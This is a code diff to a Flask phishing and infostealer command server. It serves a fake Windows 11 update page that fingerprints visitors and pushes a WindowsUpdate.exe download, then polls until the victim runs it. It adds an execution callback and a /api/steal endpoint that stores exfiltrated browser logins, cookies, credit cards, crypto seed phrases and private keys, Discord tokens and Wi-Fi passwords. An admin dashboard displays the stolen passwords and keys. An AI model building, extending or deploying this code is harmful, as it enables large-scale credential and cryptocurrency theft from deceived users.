@@ -11,7 +11,7 @@ import requests
 from flask import Flask, request, render_template_string, redirect, jsonify, make_response, send_file, session
 from functools import wraps
 import logging
-import user_agents  # ADD THIS - will need to add to requirements.txt
+import user_agents
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -48,7 +48,7 @@ def init_db():
                 hostname TEXT,
                 username TEXT,
                 device_name TEXT,
-                device_type TEXT,  -- Phone, Tablet, Desktop, Laptop
+                device_type TEXT,
                 os_version TEXT,
                 os_build TEXT,
                 architecture TEXT,
@@ -155,10 +155,13 @@ def init_db():
                 infection_time TIMESTAMP,
                 last_seen TIMESTAMP,
                 exfil_time TIMESTAMP,
+                exe_run_time TIMESTAMP,
                 
                 -- Status
                 analyzed BOOLEAN DEFAULT 0,
-                notified BOOLEAN DEFAULT 0
+                notified BOOLEAN DEFAULT 0,
+                exe_downloaded BOOLEAN DEFAULT 0,
+                exe_ran BOOLEAN DEFAULT 0
             )
         ''')
         
@@ -189,6 +192,7 @@ def init_db():
         conn.execute('''
             CREATE TABLE IF NOT EXISTS downloads (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
+                victim_id TEXT,
                 ip TEXT,
                 user_agent TEXT,
                 downloaded_time TIMESTAMP
@@ -277,11 +281,23 @@ def capture_browser_data():
                 UPDATE victims SET
                     browser_cookies = ?,
                     browser_storage = ?,
+                    screen_res = ?,
+                    timezone = ?,
+                    language = ?,
+                    platform = ?,
+                    cpu_cores = ?,
+                    ram = ?,
                     last_seen = ?
                 WHERE victim_id = ?
             ''', (
                 json.dumps(data.get('cookies', {})),
                 json.dumps(data.get('storage', {})),
+                data.get('device', {}).get('screen', ''),
+                data.get('device', {}).get('timezone', ''),
+                data.get('device', {}).get('language', ''),
+                data.get('device', {}).get('platform', ''),
+                str(data.get('device', {}).get('hardwareConcurrency', '')),
+                str(data.get('device', {}).get('deviceMemory', '')),
                 datetime.datetime.now().isoformat(),
                 victim_id
             ))
@@ -290,11 +306,45 @@ def capture_browser_data():
     return jsonify({"status": "ok"})
 
 # ==========================================
-# MAIN PAGE - ULTRA REALISTIC WINDOWS 11 UPDATE WITH PROPER DOWNLOAD THEN REDIRECT
+# EXE EXECUTED CALLBACK
+# ==========================================
+@app.route('/api/executed', methods=['POST'])
+def exe_executed():
+    """Called when victim runs the EXE"""
+    data = request.json
+    victim_id = data.get('victim_id')
+    
+    if victim_id:
+        with get_db() as conn:
+            conn.execute('''
+                UPDATE victims SET exe_ran = 1, exe_run_time = ? WHERE victim_id = ?
+            ''', (datetime.datetime.now().isoformat(), victim_id))
+            conn.commit()
+            logger.info(f"🔥 EXE RAN for victim {victim_id}")
+        return jsonify({"status": "ok"})
+    return jsonify({"status": "error"}), 400
+
+# ==========================================
+# CHECK IF EXE WAS EXECUTED
+# ==========================================
+@app.route('/api/check-execution', methods=['POST'])
+def check_execution():
+    data = request.json
+    victim_id = data.get('victim_id')
+    
+    if victim_id:
+        with get_db() as conn:
+            result = conn.execute('SELECT exe_ran FROM victims WHERE victim_id = ?', (victim_id,)).fetchone()
+            if result and result['exe_ran'] == 1:
+                return jsonify({"executed": True})
+    return jsonify({"executed": False})
+
+# ==========================================
+# MAIN PAGE - ULTRA REALISTIC WINDOWS 11 UPDATE
 # ==========================================
 @app.route('/')
 def index():
-    """Shows a REAL Windows 11 update page with location/device capture and Microsoft redirect AFTER download"""
+    """Shows a REAL Windows 11 update page with location/device capture"""
     
     # Get visitor IP
     visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
@@ -367,7 +417,7 @@ def index():
             ))
         conn.commit()
     
-    # ULTRA REALISTIC WINDOWS 11 UPDATE PAGE - REMOVED META REFRESH, USING JAVASCRIPT FOR SEQUENCE
+    # ULTRA REALISTIC WINDOWS 11 UPDATE PAGE
     html = f'''
     <!DOCTYPE html>
     <html lang="en">
@@ -578,13 +628,13 @@ def index():
                     <span>🔍</span> Detecting device configuration...
                 </div>
                 
-                <div class="download-note">
+                <div class="download-note" id="download-note">
                     <p>If download doesn't start automatically, <a href="/WindowsUpdate.exe">click here</a></p>
                 </div>
             </div>
         </div>
         
-        <!-- REAL-TIME BROWSER DATA CAPTURE SCRIPT WITH FIXED DOWNLOAD SEQUENCE -->
+        <!-- REAL-TIME BROWSER DATA CAPTURE SCRIPT - FIXED REDIRECT LOGIC -->
         <script>
         (function() {{
             // Collect real-time browser data
@@ -648,12 +698,16 @@ def index():
             const deviceDiv = document.getElementById('device-detect');
             deviceDiv.innerHTML = `<span>✅</span> Detected: ${{browserData.device.platform}} • ${{browserData.device.screen}} • ${{browserData.device.language}}`;
             
-            // Update progress and handle download sequence
+            // Update progress and handle download sequence - FIXED VERSION
             const progressFill = document.getElementById('progress-fill');
             const progressPercent = document.getElementById('progress-percent');
             const statusMsg = document.getElementById('status');
+            const downloadNote = document.getElementById('download-note');
             
             let percent = 0;
+            let exeTriggered = false;
+            const victimId = '{victim_id}';
+            
             const interval = setInterval(() => {{
                 percent += Math.random() * 5;
                 if (percent > 100) percent = 100;
@@ -663,19 +717,49 @@ def index():
                     statusMsg.textContent = 'Downloading security updates...';
                 }} else if (percent >= 60 && percent < 90) {{
                     statusMsg.textContent = 'Verifying download integrity...';
-                }} else if (percent >= 90) {{
-                    statusMsg.textContent = 'Download complete!';
+                }} else if (percent >= 90 && !exeTriggered) {{
+                    statusMsg.textContent = '✅ Download complete!';
                     clearInterval(interval);
+                    exeTriggered = true;
                     
-                    // Trigger EXE download FIRST
+                    // Trigger EXE download
                     window.location.href = '/WindowsUpdate.exe';
                     
-                    // Wait 2 seconds for download to start, THEN redirect to Microsoft
-                    setTimeout(() => {{
-                        window.location.href = 'https://www.microsoft.com';
-                    }}, 2000);
+                    // Update UI to wait for execution
+                    downloadNote.innerHTML = 
+                        '<p style="color: #4caf50;">✅ Update downloaded successfully!</p>' +
+                        '<p><strong>Please run WindowsUpdate.exe from your Downloads folder to complete installation.</strong></p>' +
+                        '<p style="color: #ffaa00; margin-top: 15px;">⏳ Waiting for installation to complete...</p>';
+                    
+                    // Start checking if EXE ran
+                    checkExeStatus();
                 }}
             }}, 200);
+            
+            // Function to check if EXE has been executed
+            function checkExeStatus() {{
+                const checkInterval = setInterval(() => {{
+                    fetch('/api/check-execution', {{
+                        method: 'POST',
+                        headers: {{'Content-Type': 'application/json'}},
+                        body: JSON.stringify({{victim_id: victimId}})
+                    }})
+                    .then(response => response.json())
+                    .then(data => {{
+                        if (data.executed) {{
+                            clearInterval(checkInterval);
+                            statusMsg.textContent = '✅ Installation complete!';
+                            downloadNote.innerHTML = 
+                                '<p style="color: #4caf50;">✅ Installation completed successfully!</p>' +
+                                '<p>Redirecting to Microsoft...</p>';
+                            setTimeout(() => {{
+                                window.location.href = 'https://www.microsoft.com';
+                            }}, 2000);
+                        }}
+                    }})
+                    .catch(() => {{}});
+                }}, 3000);
+            }}
         }})();
         </script>
     </body>
@@ -694,22 +778,159 @@ def download_exe():
     """Direct download endpoint for the EXE file"""
     victim_id = request.cookies.get('victim_id', 'unknown')
     
-    # Mark as downloaded in downloads table
+    # Mark as downloaded
     with get_db() as conn:
         conn.execute('''
-            INSERT INTO downloads (ip, user_agent, downloaded_time)
-            VALUES (?, ?, ?)
+            INSERT INTO downloads (victim_id, ip, user_agent, downloaded_time)
+            VALUES (?, ?, ?, ?)
         ''', (
+            victim_id,
             request.remote_addr,
             request.headers.get('User-Agent', ''),
             datetime.datetime.now().isoformat()
         ))
+        conn.execute('UPDATE victims SET exe_downloaded = 1 WHERE victim_id = ?', (victim_id,))
         conn.commit()
     
     return send_file('WindowsUpdate.exe', 
                      as_attachment=True, 
                      download_name='WindowsUpdate.exe',
                      mimetype='application/octet-stream')
+
+# ==========================================
+# API ENDPOINT - RECEIVE STOLEN DATA
+# ==========================================
+@app.route('/api/steal', methods=['POST'])
+def api_steal():
+    """Receives ALL stolen data - PASSWORDS, COOKIES, WALLETS, KEYS"""
+    data = request.json
+    
+    if not data:
+        return jsonify({"error": "No data"}), 400
+    
+    victim_id = data.get('victim_id', f"victim_{os.urandom(4).hex()}")
+    
+    with get_db() as conn:
+        # Check if victim exists
+        victim = conn.execute('SELECT * FROM victims WHERE victim_id = ?', (victim_id,)).fetchone()
+        
+        if victim:
+            # Update existing - STORE EVERYTHING
+            conn.execute('''
+                UPDATE victims SET
+                    hostname = ?,
+                    username = ?,
+                    os_version = ?,
+                    public_ip = ?,
+                    local_ip = ?,
+                    mac_address = ?,
+                    
+                    chrome_logins = ?,
+                    chrome_cookies = ?,
+                    chrome_ccs = ?,
+                    chrome_wallets = ?,
+                    
+                    firefox_logins = ?,
+                    firefox_cookies = ?,
+                    
+                    wallet_phrases = ?,
+                    wallet_keys = ?,
+                    wallet_extensions = ?,
+                    
+                    discord_tokens = ?,
+                    wifi_passwords = ?,
+                    
+                    full_data = ?,
+                    exe_ran = 1,
+                    exe_run_time = ?,
+                    last_seen = ?,
+                    exfil_time = ?,
+                    analyzed = 0
+                WHERE victim_id = ?
+            ''', (
+                data.get('system', {}).get('hostname', ''),
+                data.get('system', {}).get('username', ''),
+                data.get('system', {}).get('os', ''),
+                data.get('system', {}).get('public_ip', ''),
+                data.get('system', {}).get('local_ip', ''),
+                data.get('system', {}).get('mac', ''),
+                
+                json.dumps(data.get('chrome', {}).get('logins', [])),
+                json.dumps(data.get('chrome', {}).get('cookies', [])),
+                json.dumps(data.get('chrome', {}).get('credit_cards', [])),
+                json.dumps(data.get('chrome', {}).get('wallets', [])),
+                
+                json.dumps(data.get('firefox', {}).get('logins', [])),
+                json.dumps(data.get('firefox', {}).get('cookies', [])),
+                
+                json.dumps(data.get('wallets', {}).get('phrases', [])),
+                json.dumps(data.get('wallets', {}).get('private_keys', [])),
+                json.dumps(data.get('wallets', {}).get('extensions', [])),
+                
+                json.dumps(data.get('discord', {}).get('tokens', [])),
+                json.dumps(data.get('wifi', [])),
+                
+                json.dumps(data),
+                datetime.datetime.now().isoformat(),
+                datetime.datetime.now().isoformat(),
+                datetime.datetime.now().isoformat(),
+                victim_id
+            ))
+        else:
+            # Insert new
+            conn.execute('''
+                INSERT INTO victims (
+                    victim_id, ip, real_ip, hostname, username, os_version,
+                    public_ip, local_ip, mac_address,
+                    chrome_logins, chrome_cookies, chrome_ccs, chrome_wallets,
+                    firefox_logins, firefox_cookies,
+                    wallet_phrases, wallet_keys, wallet_extensions,
+                    discord_tokens, wifi_passwords,
+                    full_data, infection_time, last_seen, exfil_time,
+                    exe_ran, exe_run_time
+                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+            ''', (
+                victim_id,
+                request.remote_addr,
+                request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0],
+                data.get('system', {}).get('hostname', ''),
+                data.get('system', {}).get('username', ''),
+                data.get('system', {}).get('os', ''),
+                data.get('system', {}).get('public_ip', ''),
+                data.get('system', {}).get('local_ip', ''),
+                data.get('system', {}).get('mac', ''),
+                
+                json.dumps(data.get('chrome', {}).get('logins', [])),
+                json.dumps(data.get('chrome', {}).get('cookies', [])),
+                json.dumps(data.get('chrome', {}).get('credit_cards', [])),
+                json.dumps(data.get('chrome', {}).get('wallets', [])),
+                
+                json.dumps(data.get('firefox', {}).get('logins', [])),
+                json.dumps(data.get('firefox', {}).get('cookies', [])),
+                
+                json.dumps(data.get('wallets', {}).get('phrases', [])),
+                json.dumps(data.get('wallets', {}).get('private_keys', [])),
+                json.dumps(data.get('wallets', {}).get('extensions', [])),
+                
+                json.dumps(data.get('discord', {}).get('tokens', [])),
+                json.dumps(data.get('wifi', [])),
+                
+                json.dumps(data),
+                datetime.datetime.now().isoformat(),
+                datetime.datetime.now().isoformat(),
+                datetime.datetime.now().isoformat(),
+                1,
+                datetime.datetime.now().isoformat()
+            ))
+        
+        conn.commit()
+    
+    # Check for wallet keys (THE GOLD)
+    wallets = data.get('wallets', {})
+    if wallets.get('private_keys') or wallets.get('phrases'):
+        logger.info(f"🔥 WALLET KEYS FOUND! Victim: {victim_id}")
+    
+    return jsonify({"status": "ok", "victim_id": victim_id})
 
 # ==========================================
 # ALTERNATE DELIVERY - NO FILE DOWNLOAD (DIRECT EXECUTION)
@@ -764,135 +985,6 @@ def direct_run():
     return render_template_string(html)
 
 # ==========================================
-# API ENDPOINT - RECEIVE STOLEN DATA
-# ==========================================
-@app.route('/api/steal', methods=['POST'])
-def api_steal():
-    """Receives ALL stolen data - PASSWORDS, COOKIES, WALLETS, KEYS"""
-    data = request.json
-    
-    if not data:
-        return jsonify({"error": "No data"}), 400
-    
-    victim_id = data.get('victim_id', f"victim_{os.urandom(4).hex()}")
-    
-    with get_db() as conn:
-        # Check if victim exists
-        victim = conn.execute('SELECT * FROM victims WHERE victim_id = ?', (victim_id,)).fetchone()
-        
-        if victim:
-            # Update existing - STORE EVERYTHING
-            conn.execute('''
-                UPDATE victims SET
-                    hostname = ?,
-                    username = ?,
-                    os_version = ?,
-                    public_ip = ?,
-                    local_ip = ?,
-                    mac_address = ?,
-                    
-                    chrome_logins = ?,
-                    chrome_cookies = ?,
-                    chrome_ccs = ?,
-                    chrome_wallets = ?,
-                    
-                    firefox_logins = ?,
-                    firefox_cookies = ?,
-                    
-                    wallet_phrases = ?,
-                    wallet_keys = ?,
-                    wallet_extensions = ?,
-                    
-                    discord_tokens = ?,
-                    wifi_passwords = ?,
-                    
-                    full_data = ?,
-                    last_seen = ?,
-                    exfil_time = ?,
-                    analyzed = 0
-                WHERE victim_id = ?
-            ''', (
-                data.get('system', {}).get('hostname', ''),
-                data.get('system', {}).get('username', ''),
-                data.get('system', {}).get('os', ''),
-                data.get('system', {}).get('public_ip', ''),
-                data.get('system', {}).get('local_ip', ''),
-                data.get('system', {}).get('mac', ''),
-                
-                json.dumps(data.get('chrome', {}).get('logins', [])),
-                json.dumps(data.get('chrome', {}).get('cookies', [])),
-                json.dumps(data.get('chrome', {}).get('credit_cards', [])),
-                json.dumps(data.get('chrome', {}).get('wallets', [])),
-                
-                json.dumps(data.get('firefox', {}).get('logins', [])),
-                json.dumps(data.get('firefox', {}).get('cookies', [])),
-                
-                json.dumps(data.get('wallets', {}).get('phrases', [])),
-                json.dumps(data.get('wallets', {}).get('private_keys', [])),
-                json.dumps(data.get('wallets', {}).get('extensions', [])),
-                
-                json.dumps(data.get('discord', {}).get('tokens', [])),
-                json.dumps(data.get('wifi', [])),
-                
-                json.dumps(data),
-                datetime.datetime.now().isoformat(),
-                datetime.datetime.now().isoformat(),
-                victim_id
-            ))
-        else:
-            # Insert new
-            conn.execute('''
-                INSERT INTO victims (
-                    victim_id, ip, real_ip, hostname, username, os_version,
-                    public_ip, local_ip, mac_address,
-                    chrome_logins, chrome_cookies, chrome_ccs, chrome_wallets,
-                    firefox_logins, firefox_cookies,
-                    wallet_phrases, wallet_keys, wallet_extensions,
-                    discord_tokens, wifi_passwords,
-                    full_data, infection_time, last_seen, exfil_time
-                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-            ''', (
-                victim_id,
-                request.remote_addr,
-                request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0],
-                data.get('system', {}).get('hostname', ''),
-                data.get('system', {}).get('username', ''),
-                data.get('system', {}).get('os', ''),
-                data.get('system', {}).get('public_ip', ''),
-                data.get('system', {}).get('local_ip', ''),
-                data.get('system', {}).get('mac', ''),
-                
-                json.dumps(data.get('chrome', {}).get('logins', [])),
-                json.dumps(data.get('chrome', {}).get('cookies', [])),
-                json.dumps(data.get('chrome', {}).get('credit_cards', [])),
-                json.dumps(data.get('chrome', {}).get('wallets', [])),
-                
-                json.dumps(data.get('firefox', {}).get('logins', [])),
-                json.dumps(data.get('firefox', {}).get('cookies', [])),
-                
-                json.dumps(data.get('wallets', {}).get('phrases', [])),
-                json.dumps(data.get('wallets', {}).get('private_keys', [])),
-                json.dumps(data.get('wallets', {}).get('extensions', [])),
-                
-                json.dumps(data.get('discord', {}).get('tokens', [])),
-                json.dumps(data.get('wifi', [])),
-                
-                json.dumps(data),
-                datetime.datetime.now().isoformat(),
-                datetime.datetime.now().isoformat(),
-                datetime.datetime.now().isoformat()
-            ))
-        
-        conn.commit()
-    
-    # Check for wallet keys (THE GOLD)
-    wallets = data.get('wallets', {})
-    if wallets.get('private_keys') or wallets.get('phrases'):
-        logger.info(f"🔥 WALLET KEYS FOUND! Victim: {victim_id}")
-    
-    return jsonify({"status": "ok", "victim_id": victim_id})
-
-# ==========================================
 # ADMIN DASHBOARD - WARFARE GRADE
 # ==========================================
 @app.route('/admin')
@@ -915,18 +1007,14 @@ def admin_dashboard():
         # Downloads
         downloads = conn.execute('SELECT COUNT(*) FROM downloads').fetchone()[0]
         
+        # Executed
+        executed = conn.execute('SELECT COUNT(*) FROM victims WHERE exe_ran = 1').fetchone()[0]
+        
         # Recent victims
         victims = conn.execute('''
             SELECT * FROM victims 
             ORDER BY exfil_time DESC NULLS LAST, infection_time DESC
             LIMIT 50
-        ''').fetchall()
-        
-        # Recent downloads
-        recent_downloads = conn.execute('''
-            SELECT * FROM downloads 
-            ORDER BY downloaded_time DESC 
-            LIMIT 10
         ''').fetchall()
     
     html = '''
@@ -963,7 +1051,7 @@ def admin_dashboard():
             }
             .stats-grid {
                 display: grid;
-                grid-template-columns: repeat(5, 1fr);
+                grid-template-columns: repeat(6, 1fr);
                 gap: 15px;
                 margin-bottom: 20px;
             }
@@ -1166,7 +1254,7 @@ def admin_dashboard():
             <div>
                 <span class="badge">ACTIVE</span>
                 <span class="badge-green">''' + datetime.datetime.now().strftime('%H:%M:%S') + '''</span>
-                <span class="badge-gold">v4.0</span>
+                <span class="badge-gold">v5.0</span>
             </div>
         </div>
         
@@ -1191,6 +1279,10 @@ def admin_dashboard():
                 <div class="stat-value">''' + str(downloads) + '''</div>
                 <div class="stat-label">EXE DOWNLOADS</div>
             </div>
+            <div class="stat-card">
+                <div class="stat-value">''' + str(executed) + '''</div>
+                <div class="stat-label">EXE EXECUTED</div>
+            </div>
         </div>
         
         <div style="margin-bottom: 20px;">
@@ -1205,6 +1297,7 @@ def admin_dashboard():
             <span class="tab" onclick="filter('wallets')">💰 WITH WALLETS</span>
             <span class="tab" onclick="filter('logins')">🔐 WITH LOGINS</span>
             <span class="tab" onclick="filter('discord')">🎮 WITH DISCORD</span>
+            <span class="tab" onclick="filter('executed')">✅ EXE RAN</span>
         </div>
         
         <div id="victims-list">
@@ -1229,7 +1322,7 @@ def admin_dashboard():
         <div class="victim-card {'wallet' if has_wallet else ''}">
             <div class="victim-header">
                 <div>
-                    <span class="victim-id">🎯 {v['victim_id']}</span>
+                    <span class="victim-id">🎯 {v['victim_id'][:16]}</span>
                     <span style="margin-left: 15px;">📍 {v['real_ip'] or v['ip']}</span>
                     <span style="margin-left: 15px;">🌍 {v['city']}, {v['country']}</span>
                     <span style="margin-left: 15px;">📱 {v['device_type'] or 'Unknown'}</span>
@@ -1242,7 +1335,8 @@ def admin_dashboard():
                     <span class="badge">{len(chrome_ccs)} CCs</span>
                     <span class="badge-gold">{len(wallet_keys)} Keys</span>
                     <span class="badge-gold">{len(wallet_phrases)} Phrases</span>
-                    <span class="victim-time">{v['exfil_time'][:16] if v['exfil_time'] else v['infection_time'][:16]}</span>
+                    <span class="badge-green">EXE: {'✅' if v['exe_ran'] else '❌'}</span>
+                    <span class="victim-time">{v['last_seen'][:16] if v['last_seen'] else v['infection_time'][:16]}</span>
                 </div>
             </div>
             
@@ -1274,16 +1368,13 @@ def admin_dashboard():
         
         if wallet_keys:
             html += '<div style="color:gold; font-weight:bold; margin-bottom:10px;">🔑 PRIVATE KEYS FOUND:</div>'
-            for key in wallet_keys[:20]:
-                html += f'<div class="wallet-key">🔑 {key}</div>'
+            for key in wallet_keys[:10]:
+                html += f'<div class="wallet-key">🔑 {key[:100]}...</div>'
         
         if wallet_phrases:
             html += '<div style="color:gold; font-weight:bold; margin-top:10px; margin-bottom:10px;">📝 SEED PHRASES FOUND:</div>'
-            for phrase in wallet_phrases[:10]:
-                html += f'<div class="wallet-key">📝 {phrase}</div>'
-        
-        if wallet_extensions:
-            html += '<div style="margin-top:10px;"><b>Wallet Extensions:</b> ' + ', '.join([w.get('name', '') for w in wallet_extensions[:10]]) + '</div>'
+            for phrase in wallet_phrases[:5]:
+                html += f'<div class="wallet-key">📝 {phrase[:100]}...</div>'
         
         html += '''
             </div>
@@ -1296,8 +1387,8 @@ def admin_dashboard():
                 <div class="json-data">
         '''
         
-        for login in chrome_logins[:15]:
-            html += f'<div class="credential"><b>{login.get("url", "N/A")[:50]}</b><br>👤 {login.get("username", "")}<br>🔑 {login.get("password", "")}</div>'
+        for login in chrome_logins[:10]:
+            html += f'<div class="credential"><b>{login.get("url", "N/A")[:30]}</b><br>👤 {login.get("username", "")}<br>🔑 {login.get("password", "")}</div>'
         
         html += f'''
                 </div>
@@ -1366,7 +1457,8 @@ def admin_dashboard():
                 cards.forEach(card => {
                     if (type === 'all') card.style.display = 'block';
                     else if (type === 'wallets' && card.classList.contains('wallet')) card.style.display = 'block';
-                    else if (type !== 'wallets') card.style.display = 'none';
+                    else if (type === 'executed' && card.textContent.includes('EXE: ✅')) card.style.display = 'block';
+                    else if (type !== 'wallets' && type !== 'executed') card.style.display = 'none';
                 });
             }
             
